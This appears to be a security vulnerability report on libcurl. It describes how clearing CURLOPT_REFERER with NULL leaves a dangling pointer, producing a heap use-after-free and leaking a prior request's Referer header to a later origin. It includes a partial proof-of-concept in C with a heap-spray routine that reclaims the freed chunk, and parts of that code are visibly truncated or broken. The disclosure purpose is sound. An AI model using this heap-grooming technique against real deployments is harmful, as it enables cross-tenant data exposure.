## Vulnerability Details

## Summary:
libcurl documents that `CURLOPT_REFERER` can be set to `NULL` to disable the
Referer header again, but doing so after a transfer does not clear the cached
per-handle referer state. As a result, the next HTTP request on the same easy
handle can still send the previous request's `Referer:` value to a different
origin even though the application explicitly cleared it with the documented
API.

This is a real cross-request confidentiality problem for applications that pool
or reuse easy handles across different jobs, users, or tenants. The easiest
security framing is not "a remote server can crash curl in isolation", but
rather: a later attacker-controlled job can receive a previous job's referer on
the wire because libcurl failed to honor the documented clear operation.

Internally, the bug is caused by `data->state.referer` retaining a dangling
pointer after `CURLOPT_REFERER=NULL`. Under ASan, the next request reliably hits
a library-internal heap-use-after-free. If the freed chunk is reused before the
next transfer, libcurl can also send the new heap contents as `Referer:`.

## Most credible security boundary

The strongest real-world scenario I found is:

1. a server-side fetcher / crawler / screenshot service keeps one easy handle
   per worker so that it can reuse connections, which libcurl explicitly
   encourages
2. tenant A performs a request that legitimately needs a custom `Referer:`
   header, for example to satisfy an origin check or hotlink policy, and that
   referer contains a private dashboard URL, opaque job token, or internal path
3. after the request completes, the framework calls
   `curl_easy_setopt(easy, CURLOPT_REFERER, NULL)` exactly as documented to
   clear that per-request state while keeping the easy handle alive
4. tenant B later gets the same worker / easy handle and asks the service to
   fetch an attacker-controlled URL
5. B's server receives A's stale `Referer:` value, or another heap string that
   reused the freed referer chunk

This is why I am reporting it as a low-severity libcurl security issue rather
than only a robustness bug:

- the application follows documented libcurl behavior
- the application uses encouraged easy-handle reuse
- the confidentiality breach crosses a real trust boundary between jobs or
  tenants
- the leak is visible on the network to the attacker-controlled next origin

I would suggest evaluating it as a low-severity cross-request data exposure
issue, with the UAF as the implementation mechanism.

static char *join_url(const char *base, const char *path)
{
  size_t base_len = strlen(base);
  size_t path_len = strlen(path);
  char *out = malloc(base_len + path_len + 1U);

  if(!out)
    return NULL;

  memcpy(out, base, base_len);
  memcpy(out + base_len, path, path_len + 1U);
  return out;
}

static char *make_padded_url(const char *prefix, char fill)
{
  size_t prefix_len = strlen(prefix);
  char *out;

  if(prefix_len >= REFERER_TOTAL_LEN)
    return NULL;

  out = malloc(REFERER_TOTAL_LEN + 1U);
  if(!out)
    return NULL;

  memcpy(out, prefix, prefix_len);
  memset(out + prefix_len, fill, REFERER_TOTAL_LEN - prefix_len);
  out[REFERER_TOTAL_LEN] = '\0';
  return out;
}

static void free_spray(char **spray, size_t count)
{
  size_t i;

  if(!spray)
    return;

  for(i = 0; i < count; ++i)
    free(spray[i]);
  free(spray);
}

static char *recycle_referer_chunk(const char *target, const char *marker,
                                   struct spray_hold *hold)
{
  char **spray;
  size_t marker_size = strlen(marker) + 1U;
  size_t i;

  if(!target || !hold)
    return NULL;

  hold->items = NULL;
  hold->count = 0U;

  spray = calloc(MAX_SPRAY_ALLOCS, sizeof(*spray));
  if(!spray)
    return NULL;

  for(i = 0; i < MAX_SPRAY_ALLOCS; ++i) {
    spray[i] = malloc(marker_size);
    if(!spray[i]) {
      free_spray(spray, i);
      return NULL;
    }

    memcpy(spray[i], marker, marker_size);
    if((const void *)spray[i] == (const void *)target) {
      hold->items = spray;
      hold->count = i + 1U;
      fprintf(stderr, "recycled_referer_ptr=%p\n", (const void *)spray[i]);
      return spray[i];
    }
  }

  free_spray(spray, MAX_SPRAY_ALLOCS);
  return NULL;
}

static CURLcode do_request(CURL *easy, const char *url)
{
  CURLcode rc;

  rc = curl_easy_setopt(easy, CURLOPT_URL, url);
  if(rc != CURLE_OK)
    return rc;

  return curl_easy_perform(easy);
}

int main(int argc, char **argv)
{

  CURLcode rc;
  const char *mode;
  const char *base_url;
  char *first_url = NULL;
  char *second_url = NULL;
  char *initial_referer = NULL;

  char *used_referer = NULL;

  int exitcode = 1;

    fprintf(stderr, "usage: %s <asan|leak> <base_url>\n", argv[0]);

  }

  base_url = argv[2];

  leak_marker = make_padded_url("https://reused.invalid/", 'B');
  if(!first_url || !second_url || !initial_referer || !leak_marker) {
    fprintf(stderr, "failed to allocate URLs or referers\n");
    goto out;
  }

  rc = curl_global_init(CURL_GLOBAL_DEFAULT);
  if(rc != CURLE_OK) {
    fprintf(stderr, "curl_global_init: %s\n", curl_easy_strerror(rc));
    goto out;
  }

  easy = curl_easy_init();
  if(!easy) {
    fprintf(stderr, "curl_easy_init failed\n");
    goto out;
  }

  curl_easy_setopt(easy, CURLOPT_NOPROXY, "*");
  curl_easy_setopt(easy, CURLOPT_TIMEOUT_MS, 3000L);
  curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, sink);

  rc = curl_easy_setopt(easy, CURLOPT_REFERER, initial_referer);
  if(rc != CURLE_OK) {
    fprintf(stderr, "set initial referer: %s\n", curl_easy_strerror(rc));
    goto out;
  }

  rc = do_request(easy, first_url);
  if(rc != CURLE_OK) {
    fprintf(stderr, "first perform: %s\n", curl_easy_strerror(rc));
    goto out;
  }

  rc = curl_easy_getinfo(easy, CURLINFO_REFERER, &used_referer);
  if(rc != CURLE_OK) {

    goto out;

}

The relevant source behavior is:

- `CURLOPT_REFERER` setter frees/replaces only
  `set.str[STRING_SET_REFERER]`: `lib/setopt.c`
- `Curl_pretransfer()` binds `data->state.referer` only when the current
  referer string is non-NULL and does not clear the stale bufref in the
  documented clear path: `lib/transfer.c`
- the next HTTP request formats `data->state.referer` into the request header:
  `lib/http.c`
- `CURLINFO_REFERER` also returns that same stale pointer: `lib/getinfo.c`

This is not API misuse. `curl_easy_perform(3)` explicitly allows repeated
transfers on the same easy handle and says callers may use `curl_easy_setopt(3)`
between transfers. `CURLOPT_REFERER(3)` explicitly says setting the option to
`NULL` disables it again.

## Impact

## Summary:
An attacker who can control a later transfer in an application that reuses a
libcurl easy handle can receive stale cross-request data even after the
application correctly clears `CURLOPT_REFERER` with `NULL`. In multi-tenant
fetchers, SSRF brokers, crawlers, webhook relays, or proxy services, this can
leak a previous tenant's Referer value, an internal URL, a privacy-sensitive
path, or another string that reuses the freed heap chunk. The same valid API
sequence also produces a library-internal heap-use-after-free and can crash the
process under normal memory-safety detection. The issue breaks libcurl's
documented option-clearing contract and causes data from one logical request
session to be sent to a different HTTP peer.
